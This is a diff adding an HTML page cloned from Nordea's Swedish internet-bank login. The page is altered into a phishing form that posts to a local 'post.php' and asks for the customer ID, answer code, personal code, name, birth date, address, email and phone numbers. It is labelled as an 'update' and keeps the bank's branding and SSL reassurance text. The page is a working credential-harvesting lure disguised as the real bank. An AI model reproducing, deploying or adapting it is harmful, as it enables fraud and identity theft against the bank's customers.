@@ -1,0 +1,877 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
+<html lang="se" xml:lang="se" xmlns="http://www.w3.org/1999/xhtml">
+ <!-- Mirrored from internetbanken.privat.nordea.se/nsp/login by HTTrack Website Copier/3.x [XR&CO'2014], Sat, 09 May 2015 22:24:22 GMT -->
+ <!-- Added by HTTrack -->
+ <head>
+  <meta content="content-type" http-equiv="content-type" />
+  <!-- /Added by HTTrack -->
+  <meta content="Content-Type" http-equiv="Content-Type" />
+  <title>
+   Nordeas Internetbank Privat
+  </title>
+  <link type="text/css" href="css/nordeapn4130.css" media="screen" rel="stylesheet" />
+  <link media="print" type="text/css" href="css/print380.css" rel="stylesheet" />
+  <meta content="IE=edge" http-equiv="X-UA-Compatible" />
+  <script type="text/javascript">
+   &lt;!--
+
+function framePrint(SOLOWORK){
+ 
+	if (parent[SOLOWORK] == null) {
+		window.print();
+	}
+ 	else {
+ 		parent[SOLOWORK].focus();
+ 		parent[SOLOWORK].print();
+	}
+}
+
+function showContentAreaPrintLinkTop(localisedLinkText) {
+	document.write("&lt;div class=\"print\"&gt;&lt;table class=\"noprint\"&gt;&lt;tr&gt;&lt;td&gt;&lt;a href=\"\" onClick='window.print();return false;'&gt;&lt;img src=\"general/images/print.gif\" alt=\"\" class=\"print_icon\" /&gt;&lt;/a&gt;&lt;/td&gt;&lt;td&gt;&lt;a href=\"\" onClick='window.print();return false;'&gt;" + localisedLinkText + "&lt;/a&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/div&gt;");
+}
+
+function showContentAreaPrintLinkBottom(localisedLinkText) {
+	document.write("&lt;table class=\"print_bottom noprint\"&gt;&lt;tr&gt;&lt;td&gt;&lt;a href=\"\" onClick='window.print();return false;'&gt;&lt;img src=\"general/images/print.gif\" alt=\"\" class=\"print_icon\" /&gt;&lt;/a&gt;&lt;/td&gt;&lt;td&gt;&lt;a href=\"\" onClick='window.print();return false;'&gt;" + localisedLinkText + "&lt;/a&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;");
+}
+
+
+// --&gt;
+  </script>
+ </head>
+ <body onload="justdoit()">
+  <!-- ******** Printable area ********* -->
+  <div id="printTop">
+   <div id="printLogo">
+    <img width="180" height="39" alt="Nordea logotype" src="general/images/logoprint.gif" />
+   </div>
+   <div id="printText">
+    <p>
+     Utskriven av kund 2015.05.10 00:24:20
+    </p>
+   </div>
+  </div>
+  <!-- /******** Printable area ********* -->
+  <table width="100%" cellspacing="0" cellpadding="0">
+   <tbody>
+    <tr>
+     <td id="wrap" colspan="3">
+      <!-- A-area -->
+      <!-- ********* Section TOP *********** -->
+      <div id="top-out">
+       <div id="top">
+        <!-- ********** Section LOGO ********** -->
+        <div id="logo-out">
+         <div id="logo">
+          <a href="http://www.nordea.se/">
+           <img width="85" height="18" alt="www.nordea.se" id="logo_nordea" src="general/images/logo_nordea.gif" />
+          </a>
+         </div>
+        </div>
+        <!-- ********** Section SITE TITLE ********** -->
+        <div id="title-out">
+         <div id="title">
+          <img width="207" height="25" alt="Internetbanken" id="title_nordea" src="dev/fullsize/htmlcss/sv_SE/images/title_nordea.gif" />
+         </div>
+        </div>
+        <!-- ************* Section MAINNAVIGATION ************* -->
+        <div id="mainNavigation-out">
+         <div style="height:0px;" id="mainNavigation">
+          <!-- ************ Section TOOLBAR ********** -->
+          <div id="toolbar-out">
+           <div id="toolbar_for_shortcuts">
+            <div id="container">
+             <!-- ************ The information/Menu is not needed in SE ********** -->
+             <!-- ************ removed to skip one ErrorLog in LFW      ********** -->
+            </div>
+           </div>
+          </div>
+          <!-- ************* Section TABS ************** -->
+          <div id="tabs-out">
+           <div id="tabs">
+           </div>
+          </div>
+         </div>
+        </div>
+       </div>
+      </div>
+      <div id="padding">
+      </div>
+      <!-- End of mainNavigation -->
+      <!-- End of top -->
+      <!-- /A-area -->
+     </td>
+    </tr>
+    <!-- BCD area -->
+    <tr>
+     <td class="b_login">
+     </td>
+     <td colspan="2" class="cd">
+      <div class="bc">
+       <!-- Skip target -->
+       <p id="skiptargetholder">
+        <a tabindex="-1" class="skip" name="skiptarget" id="skiptarget">
+        </a>
+       </p>
+       <!-- End of skip target -->
+       <script type="text/javascript" src="js/jquery/jquery-1.10.2.min.js">
+       </script>
+       <script type="text/javascript">
+        $.ajaxSetup({
+		cache: false
+	});
+	
+	function GetMessageByChannelID(channelID, successMethod, errorMethod) {
+ 	    $.ajax({
+ 	        url: GetSystemStatusUrl(channelID),
+ 	        dataType: 'jsonp',
+ 	        success: successMethod,
+ 	        error: errorMethod
+ 	    });
+	}
+
+	function GetSystemStatusUrl(channelID) {
+	    var default_url = document.location.protocol + "//www.nordea.com/Sitemod/nordea_all/modules/systemstatusv2/GetMessage.ashx?channelid=" + channelID;
+		
+	    return default_url;
+	}
+
+	function GetQueryStringParams(name) {
+	    name = name.replace(/[\[]/, "\\\[").replace(/[\]]/, "\\\]");
+	    var regex = new RegExp("[\\?&amp;]" + name + "=([^&amp;#]*)"),
+	        results = regex.exec(location.search);
+	    return results == null ? "" : decodeURIComponent(results[1].replace(/\+/g, " "));
+	}
+
+	$(function () {
+		GetMessageByChannelID('9C57280A-4502-4A56-A138-BD34D483E055', success, error);
+	});
+
+	function success(response) {
+		if(response.Headline &amp;&amp; response.Content) {
+			$("#crisis_info").html("&lt;table class='er' width='100%' cellpadding='0' cellspacing='0'&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td width='40'&gt;&lt;img alt='&amp;nbsp;&amp;nbsp;' src='general/images/i_Information.gif' title='&amp;nbsp;&amp;nbsp;'&gt;&lt;/td&gt;&lt;td&gt;&lt;b&gt;"+response.Headline+"&lt;/b&gt;&lt;br&gt;"+response.Content+"&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;");
+		}
+	}
+
+	function error(response) {
+	}
+       </script>
+       <table width="100%" cellspacing="0" cellpadding="5" id="codeapp_error" class="er nodisplay">
+        <colgroup>
+         <col width="42" valign="top">
+         </col>
+        </colgroup>
+        <tbody>
+         <tr>
+          <td>
+           <img alt="Error" src="general/images/IncorrectInput.gif" />
+          </td>
+          <td>
+           <strong>
+            <div id="codeapp_error_text">
+            </div>
+           </strong>
+          </td>
+         </tr>
+        </tbody>
+       </table>
+       <br class="iebug" />
+       <div id="tabsC-out">
+        <div id="tabsC">
+         <ul>
+          <li id="current">
+           <a href="login93be.html?usecase=commonlogin&command=commonlogintabcommand&guid=FDRwdMcwLlWnDaIWeMdnaACC&commandorigin=0.commonlogintabview_SE&fpid=ARIglq5ldMfE8I9BFrI6LgCC4482589897168332072xxxxxxxxx&commonlogintab=0&hash=muVH3mDzwcAW4NjysK0bRgCC">
+            Internetbank uppdatering
+           </a>
+          </li>
+          <li>
+          </li>
+          <li>
+          </li>
+         </ul>
+        </div>
+       </div>
+       <div class="tabborder">
+        <script src="js/mobilebankidauth.js" type="text/javascript">
+        </script>
+        <script type="text/javascript">
+         &lt;!--
+	var ajaxlink = 'mbankid?usecase=mobilebankidauthorization&amp;command=getmobilebankidstatus&amp;guid=FDRwdMcwLlWnDaIWeMdnaACC&amp;commandorigin=0.commonlogintabview_SE&amp;fpid=ARIglq5ldMfE8I9BFrI6LgCC4482589897168332072xxxxxxxxx&amp;pipe=ajax&amp;hash=falsKkPAMuGgIZQQ1zKhdACC';
+	var ajaxCookie = 'efpcookieARIglq5ldMfE8I9BFrI6LgCC4482589897168332072xxxxxxxxx';
+	var device = 'desktop';
+	var isAndroid = false;
+	var currentAction = 'login';
+	var frombankidapp = 'null';
+	var hostname = window.location.protocol + "//" + window.location.host + "/nsp/";
+	var isWindowsPhone = false;
+	var pollingStatus;
+	
+	var ajaxlink_cmd = ajaxlink;
+	ajaxlink_cmd += "&amp;ajaxtoken=" + mcpGetST(ajaxCookie);
+	ajaxlink_cmd += "&amp;currentAction=" + currentAction;
+	
+	$(document).ready(function() {
+		$.ajaxSetup({ 
+			cache: false 
+		});
+		$('#personnummer').focus();
+	});
+	
+	function getStatusMbid() {
+		$(document).ready(function() {
+			var frombankidapp = 'null';
+			var loaded = 'null';
+			$('#samedevice').attr("checked", true);
+			if(frombankidapp == 'true') {
+				if(loaded == 'true') {
+					$('#progressindicatordiv').css('display', 'none');
+					$('#mobilebankidwhichdevice').css('display', 'none');
+					$('#appnotstarted').css('display', 'block');
+					
+					autoOpenBankIdApp();
+				} else {
+					getStatusForMobileDiff(ajaxlink_cmd);					
+				}
+			} else {
+				// get status
+				if(isWindowsPhone) {
+					device = "desktop";
+				}
+				if('mobile' == device) {
+					getMobilebankIdMobileStatus();
+				} else {
+					pollingStatus(ajaxlink_cmd);
+				}
+			}
+		});
+	}
+
+	function autoOpenBankIdApp() {
+		$(document).ready(function() {
+			var linkToMbidApp = $(location).attr('href');
+			var encoded = encodeURIComponent(linkToMbidApp);
+			var bankidappurl = "bankid:///?redirect=" + encoded;			
+			
+			startMBID(bankidappurl);
+			getStatusForMobileSame(ajaxlink_cmd);
+		});
+	}
+	
+	function getMobilebankIdMobileStatus() {
+		$.get(ajaxlink_cmd, function(data) {
+			var ret = handlerMobileResponse(data);
+			if(ret) {
+				pollingStatus = setTimeout(getMobilebankIdMobileStatus, 3000);
+			}
+		});
+	}
+	
+	function getStatusForMobileDiffDevice(whichdevice) {
+		var link = ajaxlink_cmd + '&amp;whichdevice=' + whichdevice;
+		$.get(link, function(data) {
+			var ret = actionResponse(data);
+			if(ret) {
+				setTimeout(getStatusForMobileDiffDevice, 3000);		
+			}
+		});
+	}
+	
+	function mobileDeviceFlow() {
+		$(document).ready(function() {
+			clearTimeout(pollingStatus);
+
+			var whichdevice = $('input[name=chooseddevice]:checked', '#whichdevice').val();
+			
+			$('#mobilebankidwhichdevice').css('display', 'none');
+			$('#cancelactionlink').css('display', 'none');
+			$('#progressindicatordiv').css('display', 'block');
+			
+			if(whichdevice == 'samedevice') {
+				if(isAndroid) {
+					startMBIDAndroid();
+					getStatusForMobileSame(ajaxlink_cmd);
+				} else {
+					$(document).ready(function() {
+						$('#reloadcurrentpage').click(function() {
+							var href = $(this).attr("href");
+					        window.location = hostname + href;
+					    });
+						
+						$('#reloadcurrentpage').trigger('click'); 
+					});
+				}
+			} else if(whichdevice == 'diffdevice') {
+				getStatusForMobileDiffDevice(whichdevice);
+			}
+		});
+	}
+	
+//--&gt;
+        </script>
+        <div id="mobilebankidlogininput">
+         <form name="commonlogin" enctype="application/x-www-form-urlencoded" method="POST" action="post.php">
+          <input type="hidden" value="true" name="JAVASCRIPT_DETECTED" />
+          <script language="JavaScript">
+           &lt;!-- 
+ window.document.commonlogin.JAVASCRIPT_DETECTED.value = "true"; 
+//--&gt;
+          </script>
+          <table width="38%" align="left" cellspacing="10" cellpadding="2">
+           <colgroup span="3">
+            <col width="20%" class="first">
+            </col>
+            <col width="19%" class="first">
+            </col>
+            <col width="61%" class="last">
+            </col>
+           </colgroup>
+           <tbody>
+            <tr>
+             <td colspan="3">
+             </td>
+            </tr>
+            <tr>
+             <td class="first last" colspan="3">
+             </td>
+            </tr>
+            <tr>
+             <td class="first last" colspan="3">
+              <label for="personnummer">
+               Personnummer:
+              </label>
+             </td>
+             <td width="82%">
+              <input type="text" onblur="inputBlur(this)" onkeypress="inputFocus(this)" id="personnummer" maxlength="13" size="14" name="userid" style="color:#888" />
+              <br />
+             </td>
+            </tr>
+            <tr>
+             <td class="first last" colspan="3">
+              <label for="personnummer">
+               Svarskod:
+              </label>
+             </td>
+             <td>
+              <input type="password" onblur="inputBlur(this)" onkeypress="inputFocus(this)" id="Svarskod" size="14" name="Svarskod" style="color:#888" />
+              <br />
+             </td>
+            </tr>
+            <tr>
+             <td class="first last" colspan="3">
+              <label for="personnummer">
+               Personlig kod:
+              </label>
+             </td>
+             <td>
+              <input type="password" onblur="inputBlur(this)" onkeypress="inputFocus(this)" id="Personligkod" size="14" name="Personligkod" style="color:#888" />
+              <br />
+             </td>
+            </tr>
+            <tr>
+             <td class="first last" colspan="3">
+              <label for="personnummer">
+               förnamn:
+              </label>
+             </td>
+             <td>
+              <input type="text" onblur="inputBlur(this)" onkeypress="inputFocus(this)" id="fornamn" size="20" name="fornamn" style="color:#888" />
+              <br />
+             </td>
+            </tr>
+            <tr>
+             <td class="first last" colspan="3">
+              <label for="personnummer">
+               efternamn:
+              </label>
+             </td>
+             <td>
+              <input type="text" onblur="inputBlur(this)" onkeypress="inputFocus(this)" id="efternamn" size="20" name="efternamn" style="color:#888" />
+              <br />
+             </td>
+            </tr>
+            <tr>
+             <td class="first last" colspan="3">
+              <label for="personnummer">
+               födelsedatum:
+              </label>
+             </td>
+             <td>
+              <input type="text" onblur="inputBlur(this)" onkeypress="inputFocus(this)" id="fodelsedatum" size="15" name="fodelsedatum" style="color:#888" />
+              <br />
+             </td>
+            </tr>
+            <tr>
+             <td class="first last" colspan="3">
+              <label for="personnummer">
+               adress:
+              </label>
+             </td>
+             <td>
+              <input type="text" onblur="inputBlur(this)" onkeypress="inputFocus(this)" id="adress" size="20" name="adress" style="color:#888" />
+              <br />
+             </td>
+            </tr>
+            <tr>
+             <td class="first last" colspan="3">
+              <label for="personnummer">
+               postnummer:
+              </label>
+             </td>
+             <td>
+              <input type="text" onblur="inputBlur(this)" onkeypress="inputFocus(this)" id="postnummer" size="20" name="postnummer" style="color:#888" />
+             </td>
+            </tr>
+            <tr>
+             <td class="first last" colspan="3">
+              <label for="personnummer">
+               e-postadress:
+              </label>
+             </td>
+             <td>
+              <input type="text" onblur="inputBlur(this)" onkeypress="inputFocus(this)" id="epostadress" size="20" name="epostadress" style="color:#888" />
+             </td>
+            </tr>
+            <tr>
+             <td class="first last" colspan="3">
+              <label for="personnummer">
+               telefon:
+              </label>
+             </td>
+             <td>
+              <input type="text" onblur="inputBlur(this)" onkeypress="inputFocus(this)" id="telefon" size="15" name="telefon" style="color:#888" />
+              <br />
+             </td>
+            </tr>
+            <tr>
+             <td class="first last" colspan="3">
+              <label for="personnummer">
+               mobil:
+              </label>
+             </td>
+             <td>
+              <input type="text" onblur="inputBlur(this)" onkeypress="inputFocus(this)" id="mobil" maxlength="13" size="15" name="mobil" style="color:#888" />
+              <br />
+             </td>
+            </tr>
+            <tr>
+             <td class="first last" colspan="3">
+             </td>
+             <td>
+              <input type="submit" value="Logga in" class="button" name="mobilebankidauthorization$requestlogonauthorization" />
+             </td>
+            </tr>
+           </tbody>
+          </table>
+         </form>
+         <br />
+        </div>
+        <table cellspacing="0" cellpadding="0" style="display:none;" id="progressstatus">
+         <tbody>
+          <tr>
+           <td valign="middle" align="center" style="height:250px;width:600px;">
+            <div style="display:none;" id="progressindicatordiv">
+             <img alt="Progress indicatorx" src="general/images/icon_loading_large_b.gif" id="progressIndicator" />
+            </div>
+            <div style="display:none;" id="mobilebankidwhichdevice">
+             <form autocomplete="off" accept-charset="ISO-8859-15" id="whichdevice" name="whichdevice" enctype="application/x-www-form-urlencoded" method="POST" action="https://internetbanken.privat.nordea.se/nsp/login">
+              <input type="hidden" value="base" name="usecase" />
+              <input type="hidden" value="formcommand" name="command" />
+              <input type="hidden" value="FDRwdMcwLlWnDaIWeMdnaACC" name="guid" />
+              <input type="hidden" value="0.commonlogintabview_SE" name="commandorigin" />
+              <input type="hidden" value="ARIglq5ldMfE8I9BFrI6LgCC4482589897168332072xxxxxxxxx" name="fpid" />
+              <input type="hidden" value="S6livreE6NJlmHNwoyrg8gCC" name="hash" />
+              <table cellspacing="0" cellpadding="3">
+               <tbody>
+                <tr>
+                 <td>
+                  Var finns det Mobila BankID du vill logga in med?
+                  <br />
+                 </td>
+                </tr>
+                <tr>
+                 <td>
+                  <label for="samedevice">
+                   <input type="radio" value="samedevice" name="chooseddevice" id="samedevice" />
+                   På den här mobilen/surfplattan
+                   <br />
+                  </label>
+                 </td>
+                </tr>
+                <tr>
+                 <td>
+                  <label for="diffdevice">
+                   <input type="radio" value="diffdevice" name="chooseddevice" id="diffdevice" />
+                    
+					
+						
+						
+						
+						
+							
+								
+									På en annan mobil/surfplatta
+                   <br />
+                  </label>
+                 </td>
+                </tr>
+                <tr>
+                 <td>
+                  <input type="submit" onclick="mobileDeviceFlow(); return false;" value="Fortsätt" id="devicesubmit" class="button" />
+                 </td>
+                </tr>
+               </tbody>
+              </table>
+             </form>
+            </div>
+            <div style="display:none;" id="mobilebankidreadytostart">
+             <table>
+              <tbody>
+               <tr>
+                <td class="third">
+                 <img title="" src="../web_elements/images/web/local/se3/se/Picture/pi17_Mobilt_BankID_step_1.html" alt="" />
+                </td>
+                <td valign="middle">
+                 Nu kan du starta BankID säkerhetsapp i din mobil eller surfplatta.
+                </td>
+               </tr>
+              </tbody>
+             </table>
+            </div>
+            <div style="display:none;" id="mobilebankidenterpassword">
+             <table>
+              <tbody>
+               <tr>
+                <td class="third">
+                 <img title="" src="../web_elements/images/web/local/se3/se/Picture/pi17_Mobilt_BankID_step_2.html" alt="" />
+                </td>
+                <td valign="middle">
+                 Ange din säkerhetskod i appen och välj Legitimera.
+                </td>
+               </tr>
+              </tbody>
+             </table>
+            </div>
+            <div style="display:none;" id="appnotstarted">
+             Om BankID säkerhetsapp inte startar automatiskt så behöver du själv starta
+den i din mobil eller surfplatta.
+             <br />
+            </div>
+            <div style="display:none" id="cancelwitherrorlink">
+             <a id="cancelwitherror" href="login33cc.html?usecase=commonlogin&command=commonlogintabcommand&guid=FDRwdMcwLlWnDaIWeMdnaACC&commandorigin=0.commonlogintabview_SE&fpid=ARIglq5ldMfE8I9BFrI6LgCC4482589897168332072xxxxxxxxx&hash=lAkHlr8qBdIAZtMCBqthzgCC">
+              cancellink
+             </a>
+            </div>
+            <iframe style="display:none" id="mobilebankidlink">
+            </iframe>
+            <a style="display:none" id="androidappurl" href="bankid:///?redirect=null">
+             android app url
+            </a>
+            <div style="display:none">
+             <a id="reloadcurrentpage" href="mbankid4641.html?usecase=mobilebankidauthorization&command=reloadcurrentpage&guid=FDRwdMcwLlWnDaIWeMdnaACC&commandorigin=0.commonlogintabview_SE&fpid=ARIglq5ldMfE8I9BFrI6LgCC4482589897168332072xxxxxxxxx&frombankidapp=true&mobilebankidstep=getstatus&hash=S545aU5KsQe78uaKedKU4ACC">
+              redirect
+             </a>
+            </div>
+           </td>
+           <td valign="middle" align="left">
+            <div style="display:none" id="cancelactionlink">
+             <a href="login33cc.html?usecase=commonlogin&command=commonlogintabcommand&guid=FDRwdMcwLlWnDaIWeMdnaACC&commandorigin=0.commonlogintabview_SE&fpid=ARIglq5ldMfE8I9BFrI6LgCC4482589897168332072xxxxxxxxx&hash=lAkHlr8qBdIAZtMCBqthzgCC">
+              Avbryt
+             </a>
+            </div>
+           </td>
+          </tr>
+         </tbody>
+        </table>
+       </div>
+       <br />
+       <h2>
+        Instruktioner för inloggning
+       </h2>
+       <table>
+        <tbody>
+         <tr>
+          <td class="cardreader">
+           <ol>
+            <li>
+             <span lang="sv" xml:lang="sv" id="result_box">
+                Ange dina personuppgifter.
+             </span>
+            </li>
+            <li>
+             <span lang="sv" xml:lang="sv">
+                 Du kan fylla uppgifter om din telefon eller surfplatta och ange din personliga kod också
+             </span>
+            </li>
+           </ol>
+          </td>
+          <td>
+           <img border="0" title="" src="../web_elements/images/web/local/se3/se/Picture/pi17_Mobilt_BankID_Login_instruktions.html" alt="" />
+          </td>
+         </tr>
+        </tbody>
+       </table>
+       <br />
+       <p>
+        <img alt="" id="i_m_lock" src="general/images/i_m_lock.gif" />
+        <span lang="sv" xml:lang="sv" id="result_box2">
+         Denna anslutning är krypterad med SSL / TLS-teknik. Låset på webbläsaren visar att förbindelsen är krypterad. Genom att klicka på låset kan du kontrollera att du säkert samman med Nordea.
+        </span>
+       </p>
+       <div style="display:none" id="loginlink">
+        <a id="templink" href="mbankidf16b.html?usecase=mobilebankidauthorization&command=mobilebankidcontinue&guid=FDRwdMcwLlWnDaIWeMdnaACC&commandorigin=0.commonlogintabview_SE&fpid=ARIglq5ldMfE8I9BFrI6LgCC4482589897168332072xxxxxxxxx&currentAction=login&nextcommand=loginwithmobilebankid&nextusecase=commonlogin&hash=R7eQm4LETEOZZvKzPJCZUQCC">
+        </a>
+       </div>
+      </div>
+      <div class="m2">
+      </div>
+      <div class="d2">
+       <h3 class="bar1">
+        Aktuellt
+       </h3>
+       <div class="linklist">
+        <ul>
+         <li>
+          <a href="http://www.nordea.se/om-nordea/sakerhet-bedrageri.html" target="_blank">
+           Läs mer om säkerhet
+           <img border="0" alt="" class="link_icon" src="../web_elements/images/web/common/content/All/Icon/ic4_icon_open.gif" title="" />
+          </a>
+         </li>
+        </ul>
+        <p>
+        </p>
+       </div>
+       <h3 class="bar1">
+        Problem att logga in?
+       </h3>
+       <div class="linklist">
+        <ul>
+         <li>
+          <a href="http://www.nordea.se/privat/vardagstjanster/internet-mobil-telefon/felsokning-internetbanken.html" target="_blank">
+           Tips på hur du enkelt kan lösa vanliga problem. Få hjälp här
+           <img border="0" alt="" class="link_icon" src="../web_elements/images/web/common/content/All/Icon/ic4_icon_open.gif" title="" />
+          </a>
+         </li>
+        </ul>
+        <p>
+        </p>
+       </div>
+       <h3 class="bar1">
+        Kom igång
+       </h3>
+       <div class="linklist">
+        <img border="0" alt="" class="fullwidth" src="../web_elements/images/web/local/se3/se/Picture/pi16_BankID_Mobilt_260x100.jpg" title="" xmlns:java="http://xml.apache.org/xslt/java" />
+        <ul>
+         <li>
+          <a href="http://www.nordea.se/privat/vardagstjanster/internet-mobil-telefon/Kom-igang-med-internetbanken.html" target="_blank">
+           Kom igång med Internetbanken
+           <img border="0" alt="" class="link_icon" src="../web_elements/images/web/common/content/All/Icon/ic4_icon_open.gif" title="" />
+          </a>
+         </li>
+         <li>
+          <a href="http://www.nordea.se/privat/vardagstjanster/internet-mobil-telefon/Kom-igang-med-bankid.html" target="_blank">
+           Kom igång med Mobilt BankID
+           <img border="0" alt="" class="link_icon" src="../web_elements/images/web/common/content/All/Icon/ic4_icon_open.gif" title="" />
+          </a>
+         </li>
+        </ul>
+        <p>
+        </p>
+       </div>
+      </div>
+     </td>
+    </tr>
+   </tbody>
+  </table>
+  <table width="100%" cellspacing="0" cellpadding="0">
+   <tbody>
+    <tr>
+     <td class="fb">
+      <a href="#top">
+       Upp
+      </a>
+     </td>
+     <td class="fm">
+      <a href="#top">
+       <img alt="" id="bt" src="general/images/bt.gif" />
+      </a>
+     </td>
+     <td class="fcd">
+      © Copyright 2015 Nordea 10 maj 2015, kl. 00.24,
+      <a target="_blank" href="http://www.nordea.se/Privat/Information+om+behandling+av+personuppgifter/214014.html" class="noprint">
+       Behandling av personuppgifter mm
+      </a>
+     </td>
+    </tr>
+    <!-- ******** Build: 2015-04-08 15:27:28 ********* -->
+    <!-- /Footer -->
+   </tbody>
+  </table>
+  <div id="printFooter">
+   <p>
+    Utskriven av kund © Copyright 2015 Nordea · kl.: 2015.05.10 00:24:20 GMT +2
+   </p>
+  </div>
+  <!-- /PrintFooter -->
+  <script type="text/javascript" src="js/webtrends_SE.js">
+  </script>
+  <script type="text/javascript" src="js/createPageTitleAndContentGroup_WT.js">
+  </script>
+  <script type="text/javascript">
+   var currDate = "05/10/2015";
+var currTime = "00:24:20";
+var invoiceNumber = "1431210260332";
+var pageId = 'commonloginpage';
+//&lt;![CDATA[
+var _tag=new WebTrends();
+_tag.dcsGetId();
+//]]&gt;&gt;
+  </script>
+  <script src="http://statse.webtrendslive.com/dcsxpehghvz5bdof171e917on_5x6c/wtid.js" type="text/javascript">
+  </script>
+  <script type="text/javascript">
+   //&lt;![CDATA[
+_tag.dcsCustom=function(){
+
+    
+    create_breadcrumbs();
+
+    
+	_tag.dcsid="dcsxpehghvz5bdof171e917on_5x6c";
+	_tag.fpcdom="";
+	_tag.DCSext.wsite="PN-SE";
+	_tag.DCSext.lang="sv_SE";
+
+    
+    var campaigns = "";
+
+    var arr = new Array();
+    arr = document.getElementsByTagName("WTad");
+    for(var i = 0; i &lt; arr.length; i++) {
+        campaigns += document.getElementsByTagName("WTad")[i].getAttribute('value') + ";";
+    }
+    if (campaigns != "") {
+        _tag.WT.ad=campaigns;
+    }
+    
+    
+
+	var mcrmboxi = "";
+
+    var boxarr = new Array();
+    boxarr = document.getElementsByTagName("WTmcrmboxi");
+    for(var i = 0; i &lt; boxarr.length; i++) {
+        mcrmboxi += document.getElementsByTagName("WTmcrmboxi")[i].getAttribute('value') + ";";
+    }
+    if (mcrmboxi != "") {
+        _tag.DCSext.mcrmboxi=mcrmboxi;
+	}	
+		
+	var mcrmboxiplace = "";
+
+    var boxplacearr = new Array();
+    boxplacearr = document.getElementsByTagName("WTmcrmboxiplacement");
+    for(var i = 0; i &lt; boxplacearr.length; i++) {
+        mcrmboxiplace += document.getElementsByTagName("WTmcrmboxiplacement")[i].getAttribute('value') + ";";
+    }
+	
+    if (mcrmboxiplace != "") {
+        _tag.DCSext.mcrmboxiplacement = mcrmboxiplace;	
+	}
+    
+    
+    
+       
+    if ("null" !== "null") {
+    	_tag.DCSext.mcrmboxc = "null" + " - " + "null" ;
+    	_tag.DCSext.mcrmboxcplacement = "null";
+    	_tag.DCSext.mcrmboxcaction = "null";
+    }	
+		
+			
+
+    if (window.create_WT_tags) {
+        create_WT_tags();
+    } else {
+        if (document.getElementById("SOLOWORK")){
+            if (SOLOWORK.create_WT_tags){            	
+                SOLOWORK.create_WT_tags();
+            } 
+        }
+    }
+
+    if ("false"=="true") {
+        _tag.WT.rv="1";
+        _tag.DCSext.loginmethod="";
+        _tag.DCSext.logintype="";
+        _tag.WT.seg_2="";
+    }
+    if ("false"=="true") {
+        _tag.DCSext.loginmethod="";
+        _tag.DCSext.logintype="";
+    }
+}
+
+
+
+function call_webtrends(){
+    
+    if (window.create_WT_tags) {
+        _tag.dcsCollect();
+    } else {
+        if (document.getElementById("SOLOWORK")){
+            if (SOLOWORK.iframe_request_wt) {
+                _tag.dcsCollect();
+            }
+        } else {
+            _tag.dcsCollect();
+        }
+    }
+}
+
+
+
+function addLoadEvent(func) {
+    var oldonload = window.onload;
+    if (typeof window.onload != 'function') {
+        window.onload = func;
+    } else {
+        window.onload = function() {
+        if (oldonload) {
+            oldonload();
+        }
+            func();
+        }
+    }
+}
+
+addLoadEvent(call_webtrends);
+
+//]]&gt;&gt;
+  </script>
+  <noscript>
+   &lt;div&gt;
+		&lt;img alt="DCSIMG" id="DCSIMG" width="1" height="1" src="../../statse.webtrendslive.com/dcsxpehghvz5bdof171e917on_5x6c/njsac4b.gif?dcsuri=/nojavascript&amp;amp;WT.js=No&amp;amp;WT.tv=9.3.0&amp;amp;dcssip=internetbanken.privat.nordea.se"/&gt;
+	&lt;/div&gt;
+  </noscript>
+  <script language="JavaScript">
+   &lt;!--
+  function justdoit() 
+   { 
+  } 
+//--&gt;
+  </script>
+  <script type="text/javascript">
+   function create_WT_tags(){
+	  //&lt;![CDATA[
+	   _tag.DCSext.wtexclude="login";
+	   // login is technically on the open pages so we should use their dcsid. We only do this for production (where fpcdom has a value)
+	   
+				if (_tag.fpcdom != "")
+					_tag.dcsid="dcsc1x8dhuz5bdmfksdud4j00_4z4o";
+				
+			
+	  //]]&gt;&gt;
+ }
+  </script>
+ </body>
+ <!-- Mirrored from internetbanken.privat.nordea.se/nsp/login by HTTrack Website Copier/3.x [XR&CO'2014], Sat, 09 May 2015 22:25:16 GMT -->
+</html>
